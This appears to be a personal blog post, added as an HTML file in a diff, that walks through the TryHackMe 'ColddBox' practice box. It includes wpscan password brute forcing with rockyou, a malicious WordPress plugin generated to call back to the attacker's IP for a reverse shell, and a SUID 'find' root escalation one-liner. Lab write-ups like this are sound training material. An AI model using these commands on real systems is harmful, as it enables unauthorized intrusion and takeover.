@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <link rel="stylesheet" href="/style.css">
+        <title>christopher di-nozzi</title>
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta
+            name="description"
+            content="A page generated using ssg. Probably a blog post.">
+    </head>
+    <div id="header">
+   <h1> <a href="/">christopher di-nozzi</a></h1>
+    <nav>
+        <a href="/about">about</a>
+        <span>|</span>
+        <a href="/projects">projects</a>
+        <span>|</span>
+        <a href="/blog">blog</a>
+    </nav>
+    <hr>
+    </div>
+    <div id="main">
+<h1>TryHackMe Walkthrough - ColddBox</h1>
+
+<h3>No beers were found in this room :(</h3>
+
+<p>15/01/2021</p>
+
+<p>Back again with another easy box from TryHackMe! You can check the room out <a href="https://tryhackme.com/room/colddboxeasy">here</a>! <br />
+tl:dr enumerate usernames, brute force passwords, reverse shell with malicious WordPress plugin and escalate privilege using a bad SUID.</p>
+
+<h2>Enumeration</h2>
+
+<p>As always, let's start with some enumeration. I ran a few different scans - nmap, nikto, wpscan and dirb. The nmap scan was a basic full port and service scan. It showed us two things. <br />
+1. Port 80 is open so we're working with a webserver (hence the other scans run) <br />
+2. SSH is there but it's running on a non standard port (4512)</p>
+
+<p><code>
+nmap -p- -sV 10.10.207.52 <br />
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 09:27 GMT <br />
+Nmap scan report for 10.10.207.52 <br />
+Host is up (0.044s latency). <br />
+Not shown: 65533 closed ports <br />
+PORT STATE SERVICE VERSION <br />
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) <br />
+4512/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) <br />
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
+</code></p>
+
+<p>Out nikto scan also found a few interesting items!</p>
+
+<p><code>
+\+ OSVDB-3092: /hidden/: This might be interesting... <br />
+\+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found. <br />
+\+ OSVDB-3233: /icons/README: Apache default file found. <br />
+\+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version <br />
+\+ /wp-links-opml.php: This WordPress script reveals the installed version. <br />
+\+ OSVDB-3092: /license.txt: License file found may identify site software. <br />
+\+ /: A Wordpress installation was found. <br />
+\+ Cookie wordpress\_test\_cookie created without the httponly flag <br />
+\+ /wp-login.php: Wordpress login found
+</code></p>
+
+<p>Let's start with the "hidden" directory. Visiting it landed us on a page with some interesting test...</p>
+
+<p><code>
+U-R-G-E-N-T <br />
+C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
+</code></p>
+
+<p>Now we know 3 users - C0ldd, Huge and Philip. Seems like Philip is the boss! We can confirm this with a "wpscan" using the "--enumereate u" flag stuck on the end. I put all these usernames in a file called "users.txt".</p>
+
+<p><code>
+\[+\] philip <br />
+| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) <br />
+| Confirmed By: Login Error Messages (Aggressive Detection)
+</code>
+<code>
+\[+\] c0ldd <br />
+| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) <br />
+| Confirmed By: Login Error Messages (Aggressive Detection)
+</code>
+<code>
+\[+\] hugo <br />
+| Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) <br />
+| Confirmed By: Login Error Messages (Aggressive Detection)
+</code></p>
+
+<p>We also found a "/wp-login.php" file, which is the standard wordpress login portal. This could be handy if we ever find some passwords for our usernames!</p>
+
+<h2>User + Root Flag</h2>
+
+<p>So we have some usernames and a login portal. We need passwords! I did some more scanning and fiddling about but didn't find any, so let’s try some good ol' brute force. We can use wpscan to do this job with the command:</p>
+
+<p><code>
+wpscan --url http://10.10.207.52 -U users.txt -P /usr/share/wordlists/rockyou.txt
+</code></p>
+
+<p>I let that run for a minute or two and boom! We have the password for "c0ldd"! ((9876543210)) We can use this to login via "/wp-login.php". Once in, I had a snoop around but didn't find any nice plain text passwords. Time for <a href="https://github.com/wetw0rk/malicious-wordpress-plugin">Malicious WordPress Plugin</a>!! We can use this to create a reverse shell on the server. Simply follow the intructions on the github page, it's very simple (make sure the IP you use to call back to is the one on the TryHackMe website in the top right corner in the little green box!!).</p>
+
+<p><code>
+python3 wordpwn.py 10.8.16.218 1234 Y
+</code></p>
+
+<p>Once it was created, we upload the plugin .zip file to the wordpress site and visit the page!</p>
+
+<p><code>
+http://(target)/wp-content/plugins/malicious/wetw0rk\_maybe.php
+</code></p>
+
+<p>Pop! There's our shell! I decided to downgrade from meterpreter to a normal shell by running "shell" and then upgrade to a nice normal shell using python3!</p>
+
+<p><code>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+</code></p>
+
+<p>Now we can explore! I found a "user.txt" file in the home folder of "c0ldd" but didn't have the permission to access it! Lets try something else...</p>
+
+<p>I couldn't find anything else. Lets try some privilage escalation! Doing a quick "suid" search came up with a few results. After checking them all in GTFOBins, I found a way to abuse find to let us get root access.</p>
+
+<p><code>
+www-data@ColddBox-Easy:/var/www/html/wp-admin$ find / -perm /4000 2&gt;/dev/null <br />
+find / -perm /4000 2&gt;/dev/null <br />
+/bin/su <br />
+/bin/ping6 <br />
+/bin/ping <br />
+/bin/fusermount <br />
+/bin/umount <br />
+/bin/mount <br />
+/usr/bin/chsh <br />
+/usr/bin/gpasswd <br />
+/usr/bin/pkexec <br />
+/usr/bin/find <br />
+/usr/bin/sudo <br />
+/usr/bin/newgidmap <br />
+/usr/bin/newgrp <br />
+/usr/bin/at <br />
+/usr/bin/newuidmap <br />
+/usr/bin/chfn <br />
+/usr/bin/passwd <br />
+/usr/lib/openssh/ssh-keysign <br />
+/usr/lib/snapd/snap-confine <br />
+/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic <br />
+/usr/lib/eject/dmcrypt-get-device <br />
+/usr/lib/policykit-1/polkit-agent-helper-1 <br />
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</code></p>
+
+<p>If we run the following command, we can get root access:</p>
+
+<p><code>
+find . -exec /bin/sh -p \\; -quit
+</code></p>
+
+<p>Just like that, we're root! You can check this by running "whoami". Now we can just go grab both the root and the user flag.</p>
+
+<h2>Conclusion</h2>
+
+<p>This way of obtaining the flags doesn't seem like the intended method due to the fact we never used SSH and found the userflag after getting root access. However, it works and is therefore valid!</p>
+</div>
+    <hr>
+    <footer>
+        <nav>
+            <a href="https://twitter.com/chris_dinozzi">twitter</a>
+            <span>|</span>
+            <a href="https://unsplash.com/@chrisdinozzi">photos</a>
+            <span>|</span>
+            <a href="https://github.com/chrisdinozzi">github</a>
+        </nav>
+    </footer>
+</html>
